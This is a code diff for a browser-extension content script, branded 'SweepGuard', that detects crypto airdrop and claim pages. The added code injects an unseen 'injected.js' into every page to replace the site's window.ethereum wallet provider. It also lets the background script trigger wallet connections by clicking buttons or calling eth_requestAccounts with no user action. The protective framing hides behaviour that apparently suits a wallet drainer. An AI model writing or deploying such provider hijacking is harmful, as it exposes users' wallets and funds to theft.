@@ -1,5 +1,5 @@
-// SweepGuard Extension - Content Script
-// Runs on every page to detect claim pages and wallet connections
+// SweepGuard Extension - Content Script v2.2
+// Injects custom wallet provider and detects claim pages
 
 (function() {
   'use strict';
@@ -10,22 +10,46 @@
   
   console.log('[SweepGuard] Content script loaded on:', window.location.href);
   
-  // Claim page detection patterns
+  // ===== INJECT CUSTOM PROVIDER =====
+  // This must be injected into the main world to intercept window.ethereum
+  function injectProvider() {
+    try {
+      const script = document.createElement('script');
+      script.src = chrome.runtime.getURL('injected.js');
+      script.onload = () => {
+        console.log('[SweepGuard] Provider injected successfully');
+        script.remove();
+      };
+      (document.head || document.documentElement).appendChild(script);
+    } catch (e) {
+      console.log('[SweepGuard] Provider injection failed:', e);
+    }
+  }
+  
+  // Inject immediately
+  injectProvider();
+  
+  // Also try after page load (some sites load ethereum late)
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', injectProvider);
+  }
+  window.addEventListener('load', injectProvider);
+  
+  // ===== CLAIM PAGE DETECTION =====
   const CLAIM_PATTERNS = [
     'claim', 'airdrop', 'merkle', 'distribution', 'rewards',
-    'vesting', 'unlock', 'token-claim', 'airdrop-claim'
+    'vesting', 'unlock', 'token-claim', 'airdrop-claim',
+    'collect', 'mint', 'free-mint'
   ];
   
-  // Known claim function selectors
   const CLAIM_SELECTORS = [
     'button[class*="claim"]', 'button[class*="Claim"]',
     '[id*="claim"]', '[class*="airdrop"]',
     'a[href*="claim"]', 'button:contains("Claim")',
     'button:contains("claim")', 'button:contains("Mint")',
-    'button:contains("mint")', 'button:contains("Collect")'
+    'button:contains("Collect")', 'button:contains("Free")'
   ];
   
-  // Detect if this is a claim page
   function isClaimPage() {
     const url = window.location.href.toLowerCase();
     const title = document.title.toLowerCase();
@@ -38,7 +62,6 @@
     );
   }
   
-  // Find claim button on page
   function findClaimButton() {
     for (const selector of CLAIM_SELECTORS) {
       try {
@@ -55,7 +78,6 @@
     return null;
   }
   
-  // Find contract address on page
   function findContractAddress() {
     const text = document.body?.innerText || '';
     const addressRegex = /0x[a-fA-F0-9]{40}/g;
@@ -63,8 +85,8 @@
     return addresses[0] || null;
   }
   
-  // Detect wallet connect button
-  function findWalletConnect() {
+  // ===== WALLET CONNECT DETECTION =====
+  function findWalletConnectButton() {
     const selectors = [
       'button[class*="connect"]', 'button[class*="Connect"]',
       '[id*="connect"]', '[class*="wallet"]',
@@ -73,7 +95,12 @@
       'button:contains("MetaMask")', 'button:contains("metamask")',
       'button:contains("Connect Wallet")', '[data-testid*="connect"]',
       '[data-testid*="wallet"]', '.web3-modal', '.wallet-modal',
-      '#web3-modal', '#wallet-modal', '[class*="web3"]'
+      '#web3-modal', '#wallet-modal', '[class*="web3"]',
+      '[class*="Web3"]', '[class*="WEB3"]',
+      'button[data-testid="wallet-connect"]',
+      'button[data-testid="connect-button"]',
+      '.connect-btn', '.wallet-btn', '.btn-connect',
+      '#connect-btn', '#wallet-btn'
     ];
     
     for (const selector of selectors) {
@@ -83,10 +110,10 @@
           const text = el.innerText?.toLowerCase() || '';
           const style = window.getComputedStyle(el);
           
-          // Check if visible
           if (style.display !== 'none' && style.visibility !== 'hidden') {
             if (text.includes('connect') || text.includes('wallet') || 
-                text.includes('metamask') || text.includes('web3')) {
+                text.includes('metamask') || text.includes('web3') ||
+                text.includes('link')) {
               return el;
             }
           }
@@ -96,7 +123,7 @@
     return null;
   }
   
-  // Monitor for wallet connect modal
+  // ===== WALLET MODAL DETECTION =====
   function watchForWalletModal() {
     const observer = new MutationObserver((mutations) => {
       for (const mutation of mutations) {
@@ -104,40 +131,43 @@
           if (node.nodeType === Node.ELEMENT_NODE) {
             const element = node;
             const text = element.innerText?.toLowerCase() || '';
+            const className = element.className?.toLowerCase() || '';
+            const id = element.id?.toLowerCase() || '';
             
             // Check if this is a wallet modal
             if (text.includes('connect wallet') || text.includes('choose wallet') ||
                 text.includes('select wallet') || text.includes('metamask') ||
-                text.includes('walletconnect') || text.includes('coinbase')) {
+                text.includes('walletconnect') || text.includes('coinbase') ||
+                className.includes('wallet-modal') || className.includes('web3-modal') ||
+                id.includes('wallet-modal') || id.includes('web3-modal')) {
               
               console.log('[SweepGuard] Wallet modal detected!');
               notifyBackground('WALLET_MODAL_DETECTED', {
                 url: window.location.href,
                 title: document.title
               });
-              
-              // Add SweepGuard indicator
-              addSweepGuardIndicator();
             }
           }
         }
       }
     });
     
-    observer.observe(document.body, {
-      childList: true,
-      subtree: true
-    });
+    if (document.body) {
+      observer.observe(document.body, {
+        childList: true,
+        subtree: true
+      });
+    }
   }
   
-  // Add SweepGuard floating indicator
+  // ===== SWEEPTSGUARD INDICATOR =====
   function addSweepGuardIndicator() {
     if (document.getElementById('sweeptsguard-indicator')) return;
     
     const indicator = document.createElement('div');
     indicator.id = 'sweeptsguard-indicator';
     indicator.innerHTML = `
-      <div style="
+      <div id="sweeptsguard-btn" style="
         position: fixed;
         bottom: 20px;
         right: 20px;
@@ -156,7 +186,8 @@
         font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         transition: all 0.2s;
         border: 2px solid rgba(255,255,255,0.2);
-      " id="sweeptsguard-btn">
+        user-select: none;
+      ">
         🛡️ <span>SweepGuard Active</span>
         <span style="
           background: rgba(255,255,255,0.2);
@@ -172,18 +203,22 @@
     
     // Click handler
     document.getElementById('sweeptsguard-btn')?.addEventListener('click', () => {
-      chrome.runtime.sendMessage({ type: 'OPEN_POPUP' });
+      try {
+        chrome.runtime.sendMessage({ type: 'OPEN_POPUP' });
+      } catch (e) {
+        console.log('[SweepGuard] Could not open popup');
+      }
     });
     
     // Make draggable
     makeDraggable(indicator);
   }
   
-  // Make element draggable
   function makeDraggable(element) {
     let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+    const btn = element.firstElementChild;
     
-    element.onmousedown = dragMouseDown;
+    btn.onmousedown = dragMouseDown;
     
     function dragMouseDown(e) {
       e = e || window.event;
@@ -203,6 +238,8 @@
       pos4 = e.clientY;
       element.style.top = (element.offsetTop - pos2) + "px";
       element.style.left = (element.offsetLeft - pos1) + "px";
+      element.style.bottom = 'auto';
+      element.style.right = 'auto';
     }
     
     function closeDragElement() {
@@ -211,7 +248,7 @@
     }
   }
   
-  // Notify background script
+  // ===== MESSAGE HANDLING =====
   function notifyBackground(type, data) {
     try {
       chrome.runtime.sendMessage({ type, data });
@@ -220,65 +257,66 @@
     }
   }
   
-  // Intercept Web3 provider if available
-  function interceptWeb3() {
-    if (window.ethereum) {
-      console.log('[SweepGuard] Ethereum provider detected');
-      
-      // Store original request
-      const originalRequest = window.ethereum.request.bind(window.ethereum);
-      
-      // Override request
-      window.ethereum.request = async function(args) {
-        console.log('[SweepGuard] Web3 request:', args.method);
+  // Listen for messages from popup/background
+  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    switch (message.type) {
+      case 'GET_PAGE_INFO':
+        sendResponse({
+          url: window.location.href,
+          title: document.title,
+          isClaimPage: isClaimPage(),
+          contract: findContractAddress(),
+          hasClaimButton: !!findClaimButton(),
+          hasWalletButton: !!findWalletConnectButton(),
+          hostname: window.location.hostname
+        });
+        break;
         
-        // Detect sendTransaction
-        if (args.method === 'eth_sendTransaction') {
-          const tx = args.params?.[0];
-          if (tx?.data) {
-            const selector = tx.data.slice(0, 10);
-            console.log('[SweepGuard] Transaction selector:', selector);
-            
-            // Notify about transaction
-            notifyBackground('TRANSACTION_DETECTED', {
-              to: tx.to,
-              selector: selector,
-              value: tx.value,
-              url: window.location.href
-            });
-          }
+      case 'CONNECT_WALLET':
+        // Trigger wallet connect
+        const walletBtn = findWalletConnectButton();
+        if (walletBtn) {
+          walletBtn.click();
+          sendResponse({ success: true, method: 'clicked_button' });
+        } else if (window.ethereum) {
+          window.ethereum.request({ method: 'eth_requestAccounts' })
+            .then(accounts => sendResponse({ success: true, accounts }))
+            .catch(err => sendResponse({ success: false, error: err.message }));
+        } else {
+          sendResponse({ success: false, error: 'No wallet button found' });
         }
+        return true;
         
-        // Detect connect request
-        if (args.method === 'eth_requestAccounts') {
-          console.log('[SweepGuard] Wallet connect requested');
-          notifyBackground('WALLET_CONNECT_REQUEST', {
-            url: window.location.href,
-            title: document.title
-          });
-        }
-        
-        return originalRequest(args);
-      };
-      
-      // Mark provider as intercepted
-      window.ethereum._sweeptsguard = true;
-      window.ethereum._sweeptsguardVersion = '2.1.0';
+      case 'INJECT_PROVIDER':
+        injectProvider();
+        sendResponse({ success: true });
+        break;
     }
+  });
+  
+  // ===== DYNAMIC ELEMENT DETECTION =====
+  const bodyObserver = new MutationObserver(() => {
+    // Check if claim page now
+    if (isClaimPage() && !document.getElementById('sweeptsguard-indicator')) {
+      addSweepGuardIndicator();
+    }
+  });
+  
+  if (document.body) {
+    bodyObserver.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
   }
   
-  // Initialize
+  // ===== INITIALIZE =====
   function init() {
     console.log('[SweepGuard] Initializing...');
     
     // Check if claim page
     if (isClaimPage()) {
       console.log('[SweepGuard] Claim page detected!');
-      
-      // Add indicator
       addSweepGuardIndicator();
-      
-      // Notify background
       notifyBackground('CLAIM_PAGE_DETECTED', {
         url: window.location.href,
         title: document.title,
@@ -289,33 +327,6 @@
     
     // Watch for wallet modal
     watchForWalletModal();
-    
-    // Try to intercept Web3
-    interceptWeb3();
-    
-    // Also try after a delay (some sites load provider late)
-    setTimeout(interceptWeb3, 1000);
-    setTimeout(interceptWeb3, 3000);
-    
-    // Monitor for dynamic changes
-    const bodyObserver = new MutationObserver(() => {
-      // Check if claim page now
-      if (isClaimPage() && !document.getElementById('sweeptsguard-indicator')) {
-        addSweepGuardIndicator();
-      }
-      
-      // Try to intercept Web3 again
-      if (window.ethereum && !window.ethereum._sweeptsguard) {
-        interceptWeb3();
-      }
-    });
-    
-    if (document.body) {
-      bodyObserver.observe(document.body, {
-        childList: true,
-        subtree: true
-      });
-    }
   }
   
   // Run when ready
@@ -325,7 +336,7 @@
     init();
   }
   
-  // Also run on page navigation (SPA)
+  // Monitor page navigation (SPA)
   let lastUrl = window.location.href;
   setInterval(() => {
     if (window.location.href !== lastUrl) {
